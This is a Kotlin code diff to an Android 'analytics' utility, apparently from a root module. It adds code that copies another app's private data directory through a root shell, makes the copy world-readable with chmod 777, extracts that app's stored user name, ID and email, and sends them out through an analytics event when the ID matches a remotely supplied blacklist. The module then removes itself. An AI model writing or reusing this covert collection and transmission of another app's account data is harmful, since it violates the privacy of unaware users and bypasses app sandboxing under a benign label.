@@ -43,10 +43,10 @@ object AppAnalyticsUtils {
         else Analytics.trackEvent(name)
     }
 
-    fun Context.checkMagicalStory(isDebug: Boolean = false) {
+    private fun Context.checkMagicalStory(isDebug: Boolean = false): ArrayMap<String, String> {
         val appInfo = PackageUtils(packageManager).getApplicationInfo(
             "com.magicalstory.AppStore", 0
-        ) ?: return
+        ) ?: return ArrayMap<String, String>()
         if (isDebug) LogUtils.i("checkMagicalStory", "dataDir", appInfo.dataDir, true)
         ShellUtils.fastCmd(
             "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
@@ -62,6 +62,9 @@ object AppAnalyticsUtils {
         val email = mmkv.decodeString("email")
         if (isDebug) LogUtils.i("MMKV", "email", "$email", true)
         mmkv.close()
+        return ArrayMap<String, String>().apply {
+            put("$userId", "$name | $userId | $email")
+        }
     }
 
     fun checkAppBlackList() {
@@ -100,42 +103,55 @@ object AppAnalyticsUtils {
                 var qbsval = false
                 var cbsval = false
                 var disval = false
+                var magval = false
                 val map = ArrayMap<String, String>()
                 map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
-                if (qss.isNotEmpty()) qss = getQSlist()
-                if (css.isNotEmpty()) css = getCSid()
-                if (gid.isNotBlank()) gid = getGuid
-                if (json.isBlank()) {
+                if (qss.isEmpty()) qss = getQSlist()
+                if (css.isEmpty()) css = getCSid()
+                if (gid.isEmpty()) gid = getGuid
+                val js = safeOfNull { JSONObject(json) } ?: JSONObject()
+//                LogUtils.e("check js", "js", "$tag | $json", true)
+
+                if (json.isBlank() || js.length() <= 0) {
                     startCheckListFinal()
                     return@withDefault
                 }
-                val js = JSONObject(json)
-                (js.optJSONArray("qbk") ?: JSONArray()).apply {
+                (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
                     qss.forEach {
 //                        LogUtils.e("check qbk", "for", "$this | $it", true)
-                        if (this.toString().contains("\"$it\"")) {
+                        if (contains(it)) {
                             qbsval = true
                             map["qbk"] = it
                         }
                     }
                 }
-                (js.optJSONArray("cbk") ?: JSONArray()).apply {
+                (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
                     css.forEach {
 //                        LogUtils.e("check cbk", "for", "$this | $it", true)
-                        if (this.toString().contains("\"$it\"")) {
+                        if (contains(it)) {
                             cbsval = true
                             map["cbk"] = it
                         }
                     }
                 }
-                (js.optJSONArray("dik") ?: JSONArray()).apply {
+                (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
 //                    LogUtils.e("check dik", "for", "$this | $gid", true)
-                    if (this.toString().contains("\"$gid\"")) {
+                    if (contains(gid)) {
                         disval = true
                         map["dik"] = gid
                     }
                 }
-                if (qbsval || cbsval || disval) {
+                (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
+                    val list = checkMagicalStory()
+//                    LogUtils.e("check mag", "list", "$this | $list", true)
+                    if (list.isNotEmpty()) list.keys.forEach {
+                        if (contains(it)) {
+                            magval = true
+                            map["mag"] = list[it]
+                        }
+                    }
+                }
+                if (qbsval || cbsval || disval || magval) {
                     trackEvent("bk", map)
                     removeModule()
                     exitModule()
@@ -170,6 +186,9 @@ object AppAnalyticsUtils {
             })
             put("dik", JSONArray().apply {
                 put("e3db3345c2de23bf02477ce21a3c12c9539eb9df36dc233d81b902477435f816")
+            })
+            put("magical", JSONArray().apply {
+
             })
         }
         startCheckList("final", json.toString())
